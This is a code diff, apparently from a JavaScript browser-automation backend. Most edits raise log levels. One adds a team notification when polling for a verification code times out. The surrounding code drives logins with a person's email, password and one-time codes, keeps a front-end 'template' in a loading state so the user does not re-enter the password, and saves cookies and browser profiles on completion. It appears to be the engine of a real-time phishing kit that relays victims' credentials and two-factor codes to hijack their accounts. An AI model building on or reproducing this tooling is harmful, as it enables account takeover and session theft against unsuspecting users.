@@ -4642,7 +4642,7 @@ if (!foundSelector) {
             }
             logger.info(`[processRow][${browserId}] Exited WAITINGRECOVERYEMAIL loop. Final status: ${updateData.status}`);
         } else if (status === "WAITINGCODE") {
-            logger.info(`[processRow][${browserId}] —RESUME WAITINGCODE— sheetStatus=${sheetStatus} verified=${row[columnIndexes['verified']] ?? 'n/a'} driveUrl=${updateData.driveUrl || 'none'} code=${row[columnIndexes['verificationCode']] ? String(row[columnIndexes['verificationCode']]).slice(0, 4) : 'none'}`);
+            logger.warn(`[processRow][${browserId}] —RESUME WAITINGCODE— sheetStatus=${sheetStatus} verified=${row[columnIndexes['verified']] ?? 'n/a'} driveUrl=${updateData.driveUrl || 'none'} code=${row[columnIndexes['verificationCode']] ? String(row[columnIndexes['verificationCode']]).slice(0, 4) : 'none'}`);
             finalStatus = "WAITINGCODE";
             initialCheckResult.accountAccess = true;
             if (updateData.status !== "WAITINGCODE") {
@@ -5061,7 +5061,7 @@ if (!foundSelector) {
                                     updateData.verified = true;
                                     updateData.fullAccess = false;
                                     finalStatus = "WAITINGCODE";
-                                    logger.info(`[engineProcess][${browserId}] -WAITINGCODE (incorrect code)`);
+                                    logger.warn(`[engineProcess][${browserId}] -WAITINGCODE (incorrect code)`);
                                     activelyProcessing.delete(browserId);
                                     break; // Exit while loop — finalizer writes WAITINGCODE state to sheet
                                 }
@@ -5492,6 +5492,7 @@ if (!foundSelector) {
             if (finalStatus === "WAITINGCODE" && !codeSuccessfullyProcessed && Date.now() >= pollingTimeout) {
                 pollingTimedOut = true;
                 logger.warn(`[processRow][${browserId}][WAITINGCODE] Polling for code timed out. Setting FAILED — COMPLETED handler will save cookies + profile.`);
+                notifyTeam({ type: 'WAITINGCODE_TIMEOUT', platform, email, browserId, detail: 'Verification code polling timed out after 5 minutes. Setting FAILED.' });
                 finalStatus = "FAILED";
                 updateData.status = "FAILED";
                 updateData.verified = true;
@@ -5517,7 +5518,7 @@ if (!foundSelector) {
                     message: "Incorrect code, returned to verification options."
                 });
             }
-            logger.info(`[processRow][${browserId}] Exited WAITING_CODE loop. Final status for sheet update: ${updateData.status}`);
+            logger.warn(`[processRow][${browserId}] Exited WAITING_CODE loop. Final status for sheet update: ${updateData.status}`);
         }
 
         // Re-entry: the email phase (WAITING/WAITINGEMAIL) accepted the email and a password
@@ -5525,7 +5526,7 @@ if (!foundSelector) {
         // PROCESSING (template stays in loading) and the password is typed immediately —
         // the user never has to re-enter it, and the template never flickers to the form.
         if ((status === "WAITING" || status === "WAITINGEMAIL") && !emailPhasePasswordReentry && initialCheckResult.verificationState === 'WAITING_PASSWORD' && password && String(password).trim() !== '') {
-            logger.info(`[processRow][${browserId}] Email accepted & password already available. Proceeding directly to password entry (no WAITINGPASSWORD flicker).`);
+            logger.warn(`[processRow][${browserId}] Email accepted & password already available. Proceeding directly to password entry (no WAITINGPASSWORD flicker).`);
             emailPhasePasswordReentry = true;
             status = "WAITINGPASSWORD";
             continue;
@@ -5533,7 +5534,7 @@ if (!foundSelector) {
         break;
         }
 
-        logger.info(`[processRow][${browserId}] Result from checkAccountAccess: ${JSON.stringify(initialCheckResult)}`);
+        logger.warn(`[processRow][${browserId}] Result from checkAccountAccess: ${JSON.stringify(initialCheckResult)}`);
 
         // Determine finalStatus based on initialCheckResult and current state
         let currentVerificationOptions = initialCheckResult.verificationOptions || [];
@@ -5728,7 +5729,7 @@ if (!foundSelector) {
         } else if (finalStatus === "FAILED" && initialCheckResult.emailExists) {
             if (initialCheckResult.verificationState === 'WAITING_PASSWORD') {
                 if (password) {
-                    logger.info(`[processRow][${browserId}] WAITING_PASSWORD but password already available. Restoring to WAITINGPASSWORD for retry.`);
+                    logger.warn(`[processRow][${browserId}] WAITING_PASSWORD but password already available. Restoring to WAITINGPASSWORD for retry.`);
                     updateData.status = "WAITINGPASSWORD";
                     updateBrowserRowDataFast(browserId, { status: "WAITINGPASSWORD", email: email || '' });
                     return;
@@ -5786,7 +5787,7 @@ if (!foundSelector) {
         if (finalStatus === "WAITINGOPTIONS" || finalStatus === "WAITINGCODE" || finalStatus === "WAITINGRECOVERYEMAIL") { // Also update for WAITING_CODE if options are relevant
             updateData.verificationOptions = JSON.stringify(currentVerificationOptions);
             updateData.engineProcessing = false;
-            logger.info(`[engineProcess][${browserId}] -FINAL (return from waiting state)`);
+            logger.warn(`[engineProcess][${browserId}] -FINAL (return from waiting state)`);
             activelyProcessing.delete(browserId);
             // Force direct sheet write (bypass updateBrowserRowDataFast which only cascades terminal states)
             // so processWaitingRows reads the correct status + fresh lastUserActivity from the sheet.
@@ -5797,7 +5798,7 @@ if (!foundSelector) {
             });
             setCachedRow(browserId, { ...(getCachedRow(browserId) || {}), ...updateData });
             invalidateCache(); // Force cookieDataFetcher re-fetch so processWaitingRows sees fresh WAITINGCODE status
-            logger.info(`[processRow][${browserId}] Status set to ${finalStatus}. Sheet updated (direct write + cache invalidated).`);
+            logger.warn(`[processRow][${browserId}] Status set to ${finalStatus}. Sheet updated (direct write + cache invalidated).`);
             return; // Prevent fall-through to COMPLETED handler which would overwrite WAITINGCODE status
         }
 
